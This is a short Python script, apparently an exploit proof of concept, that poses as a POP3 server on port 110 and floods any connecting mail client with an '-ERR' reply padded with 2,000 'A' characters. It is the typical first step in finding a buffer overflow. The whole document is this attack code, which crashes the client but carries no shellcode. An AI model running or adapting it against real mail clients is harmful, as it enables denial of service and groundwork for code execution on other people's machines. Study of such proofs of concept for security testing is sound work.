
import socket

crash = "A" * 2000

payload = "-ERR " + crash

# set up listener on port 110
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 110))
        s.listen(1)
        print ("[*] Listening on port 110.")
        print ("[*] Have someone connect to you.")
        print ("[*] Type <control>-c to exit.")
        conn, addr = s.accept()
        print '[*] Received connection from: ', addr

        while 1:
                conn.send(payload)
        conn.close()
except:
        print ("[*] Connection issue!")

